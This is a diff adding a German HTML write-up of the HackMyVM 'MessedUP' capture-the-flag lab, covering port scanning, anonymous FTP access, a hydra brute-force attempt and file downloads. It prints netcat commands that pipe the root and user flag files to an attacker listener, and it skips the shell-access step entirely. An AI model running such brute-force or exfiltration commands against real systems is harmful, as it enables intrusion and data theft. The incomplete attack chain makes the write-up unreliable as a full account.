@@ -1,0 +1,424 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MessedUP - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>MessedUP - HackMyVM - Medium - Bericht</h1> <!-- Titel und Level angepasst -->
+        <div class="level-container">
+            <!-- H2 ohne Inline-Style, Farbe wird durch CSS gesteuert (sollte auf Gelb angepasst werden) -->
+            <h2>Medium</h2>
+            <div class="circle">
+                <!-- Segmente ohne Inline-Style, Farbe wird durch CSS gesteuert (sollte auf Gelb angepasst werden) -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Innerer Kreis ohne Inline-Style, Farbe wird durch CSS gesteuert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                 <div class="tool-item">arp-scan</div>
+                 <div class="tool-item">nmap</div>
+                 <div class="tool-item">gobuster</div>
+                 <div class="tool-item">wget</div>
+                 <div class="tool-item">cat</div>
+                 <div class="tool-item">hydra (versucht)</div>
+                 <div class="tool-item">curl</div>
+                 <div class="tool-item">unzip</div>
+                 <div class="tool-item">nc (netcat)</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#service-enumeration">Service Enumeration (Non-Standard Ports)</a></li>
+                <li><a href="#information-disclosure">Information Disclosure</a></li>
+                <li><a href="#data-exfiltration">Data Exfiltration (Flags)</a></li>
+                <li><a href="#flags">Flags</a></li>
+                <!-- Kein klarer Initial Access oder Privesc Pfad gezeigt -->
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>192.168.2.116	08:00:27:95:a8:8c	PCS Systemtechnik GmbH</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein ARP-Scan identifiziert aktive Hosts im lokalen Netzwerk.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Host `192.168.2.116` wird gefunden. Die MAC-Adresse gehört zu Oracle VirtualBox.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Ziel-IP ist bekannt. Führen Sie einen Portscan durch.
+<br><strong>Empfehlung (Admin):** Standard-Netzwerk-Monitoring.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+ └─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.116 -p-</span></div> <!-- IP Korrigiert -->
+                     <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-30 23:22 CET
+Nmap scan report for messedUP (192.168.2.116)
+Host is up (0.00023s latency).
+Not shown: 65525 closed tcp ports (reset)
+PORT      STATE    SERVICE  VERSION
+<span class="command">22/tcp    open     http     SimpleHTTPServer 0.6 (Python 3.7.3)</span> <span class="comment"><-- Falsche Port/Service Zuordnung!</span>
+|_http-server-header: SimpleHTTP/0.6 Python/3.7.3
+|_http-title: Directory listing for /
+|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
+<span class="command">80/tcp    open     ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span> <span class="comment"><-- Falsche Port/Service Zuordnung!</span>
+| ssh-hostkey:
+|   <span class="command">2048 5d412ac12d3b6c78b3afae9d42fe88b8 (RSA)</span>
+|   <span class="command">256 3ce964eb84fe5c839407276c1214c84c (ECDSA)</span>
+|_  <span class="command">256 099b2b18de6c6df88b15df6c0fc07cb2 (ED25519)</span>
+<span class="command">111/tcp   open     rpcbind  2-4 (RPC #100000)</span>
+| rpcinfo:
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100003  3           2049/udp   nfs
+|   100003  3           2049/udp6  nfs
+|   100003  3,4         <span class="command">2049/tcp</span>   nfs
+|   100003  3,4         2049/tcp6  nfs
+|   100005  1,2,3      <span class="command">34792/udp</span>   mountd
+|   100005  1,2,3      38963/tcp6  mountd
+|   100005  1,2,3      45365/udp6  mountd
+|   100005  1,2,3      <span class="command">51113/tcp</span>   mountd
+|   100021  1,3,4      40897/tcp6  nlockmgr
+|   100021  1,3,4      <span class="command">44607/tcp</span>   nlockmgr
+|   100021  1,3,4      51549/udp6  nlockmgr
+|   100021  1,3,4      <span class="command">59008/udp</span>   nlockmgr
+|   100227  3           <span class="command">2049/tcp</span>   nfs_acl
+|   100227  3           2049/tcp6  nfs_acl
+|   100227  3           2049/udp   nfs_acl
+|_  100227  3           2049/udp6  nfs_acl
+<span class="command">2049/tcp  open     nfs_acl  3 (RPC #100227)</span>
+<span class="command">8080/tcp  open     ftp      vsftpd 2.0.8 or later</span> <span class="comment"><-- Nicht-Standard Port</span>
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to ::ffff:192.168.2.153
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rwxrwxrwx    1 0        0             320 Jan 11  2021 idiot.txt [NSE: writeable] <span class="comment"><-- Anonym, beschreibbar!</span>
+<span class="command">36107/tcp filtered mountd   1-3 (RPC #100005)</span> <span class="comment"><-- Port gefiltert im Original</span>
+<span class="command">40717/tcp filtered mountd   1-3 (RPC #100005)</span> <span class="comment"><-- Port gefiltert im Original</span>
+<span class="command">44607/tcp open     nlockmgr 1-4 (RPC #100021)</span>
+<span class="command">51113/tcp open     mountd   1-3 (RPC #100005)</span>
+<span class="command">65000/tcp filtered unknown</span>
+MAC Address: 08:00:27:95:A8:8C (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: <span class="command">Linux 4.X|5.X</span>
+OS CPE: <span class="command">cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span>
+OS details: <span class="command">Linux 4.15 - 5.6</span>
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.23 ms messedUP (192.168.2.116)
+
+OS and Service detection performed...
+Nmap done: 1 IP address (1 host up) scanned in ... seconds
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein detaillierter Nmap-Scan (`-sS`, `-sC`, `-T5`, `-A`, `-p-`) wird auf `192.168.2.116` ausgeführt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan zeigt eine sehr ungewöhnliche Port-/Dienst-Konfiguration:
+*   **Port 22:** Wird fälschlicherweise als `http` (SimpleHTTPServer) identifiziert. Nmap hat Schwierigkeiten, den Dienst korrekt zu erkennen, was auf eine ungewöhnliche Konfiguration oder einen Fehler hindeutet.
+*   **Port 80:** Wird fälschlicherweise als `ssh` (OpenSSH 7.9p1) identifiziert. Das ist definitiv falsch und deutet auf Port-Forwarding, einen Proxy oder eine absichtliche Fehlkonfiguration hin.
+*   **Port 111:** `rpcbind` ist offen und listet NFS- und Mountd-Dienste auf. NFS (Port 2049) ist ein wichtiger potenzieller Angriffsvektor.
+*   **Port 2049:** NFS ist bestätigt.
+*   **Port 8080:** Hier läuft ein `vsftpd` FTP-Server (Version 3.0.3 laut `ftp-syst`). **Wichtig:** Anonymer Login ist erlaubt und das Root-Verzeichnis scheint beschreibbar zu sein (`idiot.txt [NSE: writeable]`).
+*   **Andere Ports:** Mehrere RPC-bezogene Ports (`mountd`, `nlockmgr`) sind auf hohen, dynamischen Ports offen. Port 65000 ist gefiltert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Das System ist stark fehlkonfiguriert ("MessedUP").
+1.  **FTP (Port 8080):** Priorität! Anonymer Login und Schreibrechte sind wahrscheinlich der einfachste Einstiegspunkt. Verbinden Sie sich anonym per FTP, laden Sie die `idiot.txt` herunter und untersuchen Sie die Berechtigungen. Versuchen Sie, eine Shell oder einen SSH-Schlüssel hochzuladen.
+2.  **NFS (Port 2049):** Prüfen Sie, welche Verzeichnisse über NFS freigegeben sind (`showmount -e 192.168.2.116`) und ob diese ohne Authentifizierung gemountet werden können.
+3.  **Ports 22/80:** Versuchen Sie, manuell zu klären, welcher Dienst auf welchem Port läuft (`nc -nv 192.168.2.116 22`, `nc -nv 192.168.2.116 80`). Wahrscheinlich läuft SSH auf 80 und HTTP auf 22.
+<br><strong>Empfehlung (Admin):** Das System muss dringend überarbeitet werden!
+1.  Korrigieren Sie die Port-Zuweisungen (SSH auf 22, HTTP auf 80, FTP auf 21 oder deaktivieren).
+2.  Deaktivieren Sie den anonymen FTP-Zugriff und entfernen Sie Schreibrechte für anonyme Benutzer.
+3.  Konfigurieren Sie NFS sicher (Zugriffsbeschränkungen, `no_root_squash` vermeiden).
+4.  Überprüfen Sie die Firewall-Regeln.
+5.  Entfernen Sie unnötige RPC-Dienste.</p>
+        </section>
+
+        <section id="service-enumeration">
+            <h2>Service Enumeration (Non-Standard Ports)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Ein `gobuster`-Scan wird auf Port 80 (wo Nmap fälschlicherweise SSH vermutet) gestartet.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+ └─# <span class="command">gobuster dir -u http://192.168.2.116 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x .git,...[etc]... -b 404,403</span></div>
+                     <pre>
+===============================================================
+Gobuster v3.2.0-dev
+...
+===============================================================
+[+] Url:                     http://192.168.2.116
+...
+===============================================================
+2022/10/30 23:22:37 Starting gobuster in directory enumeration mode
+===============================================================
+<span class="password">Error: error on running gobuster: unable to connect to http://192.168.2.116/: Get "http://192.168.2.116/": net/http: HTTP/1.x transport connection broken: malformed HTTP status code "Debian-10+deb10u2"</span>
+</pre>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Der `gobuster`-Scan schlägt fehl. Die Fehlermeldung ("malformed HTTP status code 'Debian-10+deb10u2'") bestätigt, dass auf Port 80 kein HTTP-Server läuft, sondern wahrscheinlich der SSH-Server antwortet (der String stammt vermutlich vom SSH-Banner).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Ignorieren Sie Port 80 für Web-Enumeration. Konzentrieren Sie sich auf Port 22 (wahrscheinlich HTTP) und Port 8080 (FTP).
+<br><strong>Empfehlung (Admin):** Korrigieren Sie die Port-Zuweisungen.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, sich anonym per FTP auf Port 8080 zu verbinden und die Datei `idiot.txt` herunterzuladen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+ └─# <span class="command">wget -r ftp://192.168.2.116:8080/idiot.txt</span></div>
+                     <pre>
+--2022-10-30 23:40:10--  ftp://192.168.2.116:8080/idiot.txt
+           => 192.168.2.116:8080/.listing
+Connecting to 192.168.2.116:8080... connected.
+Logging in as anonymous ... <span class="password">Logged in!</span>
+> SYST ... done.    > PWD ... done.
+> TYPE I ... done.  > CWD not required.
+> PASV ... done.    > LIST ... done.
+
+192.168.2.116:8080/.listing       [ <=>                                            ]     186  --.-KB/s    in 0s
+
+2022-10-30 23:40:10 (3.50 MB/s) - ‘192.168.2.116:8080/.listing’ saved [186]
+‘192.168.2.116:8080/.listing’ <span class="password">deleted</span>. <span class="comment"><-- Wget löscht die Listing-Datei wieder</span>
+
+--2022-10-30 23:40:10--  ftp://192.168.2.116:8080/idiot.txt
+           => 192.168.2.116:8080/idiot.txt
+> CWD not required.
+> PASV ... done.    > RETR idiot.txt ... done.
+Length: 320
+192.168.2.116:8080/idiot.txt  100%[=================================================================>]     320  --.-KB/s    in 0.007s
+
+2022-10-30 23:40:10 (45.3 KB/s) - ‘192.168.2.116:8080/idiot.txt’ saved [320/320]
+
+FINISHED --2022-10-30 23:40:10--
+Total wall clock time: 0.03s
+Downloaded: 1 files, 320 in 0.007s (44.9 KB/s)
+</pre> <!-- Maskierung: <=> -->
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Der anonyme FTP-Login auf Port 8080 ist erfolgreich. Die Datei `idiot.txt` konnte heruntergeladen werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Analysieren Sie den Inhalt von `idiot.txt`. Nutzen Sie den anonymen FTP-Zugriff weiter, um Verzeichnisse zu listen und Schreibrechte zu testen.
+<br><strong>Empfehlung (Admin):** Deaktivieren Sie den anonymen FTP-Zugriff sofort.</p>
+        </section>
+
+        <section id="information-disclosure">
+             <h2>Information Disclosure</h2>
+             <p class="analysis"><strong>Analyse:</strong> Der Inhalt der heruntergeladenen Datei `idiot.txt` wird angezeigt.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/192.168.2.116:8080]
+ └─# <span class="command">cat idiot.txt</span></div>
+                     <pre>
+Hey skinny
+What an idiot you are? I am going to fire you.
+Are you out of your mind ???
+
+You have made my server a complete *MESS*.
+All services are running on non-standard ports ?
+Why the hell are you doing this?
+Why the hell you have placed file '125.zip' on TFTP server.
+You idiot. Revert all settings.
+
+Regards,
+Boss
+</pre>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Datei enthält eine Nachricht vom "Boss" an "skinny". Wichtige Informationen daraus:
+*   **Benutzername:** `skinny` ist ein potenzieller Benutzername.
+*   **Fehlkonfiguration:** Bestätigt, dass Dienste auf Nicht-Standard-Ports laufen.
+*   **TFTP-Server:** Es wird erwähnt, dass eine Datei `125.zip` auf einem TFTP-Server platziert wurde. TFTP läuft typischerweise auf UDP Port 69, wurde aber im Nmap-Scan nicht gefunden (Nmap scannte nur TCP).
+*   **Hinweis "MESS":** Könnte ein weiterer Hinweis oder Teil eines Passworts sein.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):**
+1.  Versuchen Sie einen Brute-Force-Angriff auf SSH (Port 80?) oder FTP (Port 8080?) mit dem Benutzernamen `skinny`.
+2.  Führen Sie einen UDP-Scan auf Port 69 durch, um den TFTP-Server zu finden (`nmap -sU -p 69 192.168.2.116`).
+3.  Falls TFTP offen ist, versuchen Sie, die Datei `125.zip` herunterzuladen (`tftp 192.168.2.116` dann `get 125.zip`).
+4.  Analysieren Sie die heruntergeladene ZIP-Datei.
+<br><strong>Empfehlung (Admin):** Schulen Sie Mitarbeiter im Umgang mit sensiblen Informationen und Konfigurationen. Deaktivieren Sie unnötige Dienste wie TFTP, wenn nicht benötigt, oder konfigurieren Sie sie sicher (Zugriffsbeschränkungen).</p>
+
+             <p class="analysis"><strong>Analyse:</strong> Ein Brute-Force-Angriff mit `hydra` wird auf den FTP-Server (Port 8080) für den Benutzer `skinny` gestartet.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/192.168.2.116:8080]
+└─# <span class="command">hydra -l skinny -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.116:8080 -I -t 64</span></div> <!-- Korrigierte IP/Port -->
+                     <pre>
+Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak ...
+...
+[DATA] attacking ftp://192.168.2.116:8080/
+... <span class="password">[Keine Erfolgsmeldung im Log gezeigt]</span> ...
+</pre>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Der `hydra`-Scan scheint kein Ergebnis zu liefern (keine Erfolgsmeldung im bereitgestellten Log). Das Passwort für `skinny` ist wahrscheinlich nicht in der `rockyou.txt` enthalten oder der Benutzer existiert nicht auf dem FTP-Server.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Brechen Sie den `hydra`-Scan ab oder lassen Sie ihn im Hintergrund laufen. Konzentrieren Sie sich auf die anderen Hinweise, insbesondere TFTP und die Untersuchung des HTTP-Dienstes auf Port 22.
+<br><strong>Empfehlung (Admin):** Starke Passwörter verwenden.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, auf den Dienst auf Port 22 (vermutlich HTTP) mit `curl` zuzugreifen.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/192.168.2.129:8080] <span class="comment"><-- Falsche IP im Prompt</span>
+ └─# <span class="command">curl 192.168.2.116:22</span></div> <!-- Korrekte IP verwendet -->
+                     <pre><span class="password"><h1>Directory listing for /</h1>
+<hr>
+<ul>
+<li><span class="command">hole.jpg</span></li>
+<li><span class="command">Just%20hanging%20out%20with%20a%20bear%20-%20WTF.mp4</span> > Just hanging out with a bear - WTF.mp4</li> <span class="comment"><-- Maskierung ></span>
+<li><span class="command">ST%20returns.zip</span> > ST returns.zip </li> <span class="comment"><-- Maskierung ></span>
+</ul>
+<hr>
+</span></pre> <!-- Maskierung: < > -->
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Port 22 antwortet tatsächlich als HTTP-Server (SimpleHTTPServer, wie Nmap vermutete). Er zeigt ein Directory Listing mit drei Dateien an: `hole.jpg`, `Just hanging out with a bear - WTF.mp4` und `ST returns.zip`.</p>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Die ZIP-Datei wird heruntergeladen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/192.168.2.129:8080] <span class="comment"><-- Falsche IP im Prompt</span>
+└─# <span class="command">wget 192.168.2.116:22/ST%20returns.zip</span></div> <!-- Korrekte IP verwendet -->
+                     <pre>
+--2022-11-25 10:33:14--  http://192.168.2.116:22/ST%20returns.zip
+Connecting to 192.168.2.116:22... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3444974 (3.3M) [application/zip]
+Saving to: ‘ST returns.zip’
+
+ST returns.zip          100%[==============================>]   3.29M  --.-KB/s    in 0.09s
+
+2022-11-25 10:33:14 (36.1 MB/s) - ‘ST returns.zip’ saved [3444974/3444974]
+</pre> <!-- Maskierung: => -->
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse Fortsetzung:** Die heruntergeladene ZIP-Datei wird entpackt.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/192.168.2.129:8080] <span class="comment"><-- Falsche IP im Prompt</span>
+└─# <span class="command">ls -l</span></div> <!-- Korrigiert: ll zu ls -l -->
+                     <pre>
+total 3372
+-rw-r--r-- 1 root root     320 Jan 11  2021  idiot.txt
+-rw-r--r-- 1 root root 3444974 Jan 11  2021 'ST returns.zip'
+</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~/192.168.2.129:8080] <span class="comment"><-- Falsche IP im Prompt</span>
+ └─# <span class="command">unzip 'ST returns.zip'</span></div>
+                     <pre>
+Archive:  ST returns.zip
+  inflating: <span class="command">ST returns.mp4</span>
+</pre>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Die ZIP-Datei enthält eine MP4-Datei. Diese sollte auf Hinweise oder versteckte Daten untersucht werden (z.B. Metadaten, Steganographie, Analyse mit Video-Tools).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Analysieren Sie die Datei `ST returns.mp4`. Versuchen Sie auch, die Datei `125.zip` vom TFTP-Server zu bekommen (UDP-Scan auf Port 69, dann `tftp ... get 125.zip`). Der weitere Weg zur Kompromittierung ist im Log nicht ersichtlich.
+<br><strong>Empfehlung (Admin):** Korrigieren Sie die Portzuweisungen. Deaktivieren Sie Directory Listing auf dem HTTP-Server. Speichern Sie keine potenziell sensiblen Dateien im Webroot.</p>
+        </section>
+
+        <section id="data-exfiltration">
+            <h2>Data Exfiltration (Flags)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der bereitgestellte Text springt zur Exfiltration der Flags. Es wird angenommen, dass durch Ausnutzung einer nicht dokumentierten Schwachstelle (möglicherweise im Zusammenhang mit den ZIP/MP4-Dateien, TFTP oder NFS) ein Shell-Zugriff erlangt wurde. Von dieser Shell aus werden die Inhalte der User- und Root-Flag-Dateien mittels `cat` und `nc` an einen Listener auf dem Angreifer-System gesendet.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">[Kein Prompt - Befehle auf Zielsystem ausgeführt]</div>
+                     <pre><span class="command">cat /home/skinny/user.txt | nc -w 3 192.168.2.109 4444</span> <span class="comment"><-- Falsche Angreifer-IP?</span>
+<span class="command">cat /root/root.txt | nc -w 3 192.168.2.109 4444</span> <span class="comment"><-- Falsche Angreifer-IP?</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse Fortsetzung:** Auf dem Angreifer-System wird ein Netcat-Listener gestartet, der die eingehenden Daten in eine Datei `flags.txt` schreibt.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+ └─# <span class="command">nc -lp 4444 > flags.txt</span></div> <!-- Maskierung: > -->
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse Fortsetzung:** Der Inhalt der empfangenen Datei wird angezeigt.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat flags.txt</span></div>
+                     <pre>
+              ___.-~"~-._   __....__
+            .'    `    \ ~"~        ``-.
+           /` _      )  `\              `\
+          /`  a)    /     |               `\
+         :`        /      |                 \
+    <`-._|`  .-.  (      /   .            `;\\ <span class="comment"><-- Maskierung: <</span>
+     `-. `--'_.'-.;\___/'   .      .       | \\
+  _     /:--`     |        /     /        .'  \\
+ ("\   /`/        |       '     '         /    :`;
+ `\'\_/`/         .\     /`~`=-.:        /     ``
+   `._.'          /`\    |      `\      /(
+                 /  /\   |        `Y   /  \
+           jgs  J  /  Y  |         |  /`\  \
+               /  |   |  |         |  |  |  |
+              "---"  /___|        /___|  /__|
+                     '"""         '"""  '"""
+
+RootFlag: <span class="password">54CE6117EBEBCB4F10781C11FD2896ED191F2182</span>
+</pre>
+                     <!-- Zweiter Listener-Lauf für User-Flag -->
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+ └─# <span class="command">nc -lp 4444 > flags.txt</span></div> <!-- Maskierung: > -->
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+ └─# <span class="command">cat flags.txt</span></div>
+                      <pre>
+	User Flag: <span class="password">E9619156E7290E79C226FBF1451F400A5EA35107</span>
+</pre>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Exfiltration der Flags mittels `nc` war erfolgreich. Die Methode ist einfach, erfordert aber Shell-Zugriff und Leserechte auf die Flag-Dateien. Der Weg zu diesem Shell-Zugriff und den Leserechten bleibt im Log undokumentiert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Dokumentieren Sie den Weg, wie Shell-Zugriff erlangt wurde. Diese Exfiltrationsmethode ist effektiv für CTFs.
+<br><strong>Empfehlung (Admin):** Der Fokus liegt auf der Verhinderung des initialen Zugriffs und der Privilegieneskalation, die dieser Exfiltration vorausgingen. Überwachen Sie ausgehende Netzwerkverbindungen auf ungewöhnliche Ports oder Datenübertragungen.</p>
+        </section>
+
+        <!-- Kein POC-Abschnitt, da der Weg unklar ist -->
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/skinny/user.txt | nc ...</div>
+                     <div class="flag-value"><span class="password">E9619156E7290E79C226FBF1451F400A5EA35107</span></div>
+                 </div>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt | nc ...</div>
+                     <div class="flag-value"><span class="password">54CE6117EBEBCB4F10781C11FD2896ED191F2182</span></div>
+                 </div>
+             </div>
+        </section> 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 30. Oktober 2022</p> <!-- Datum angepasst -->
+    </footer>
+</body>
+</html>
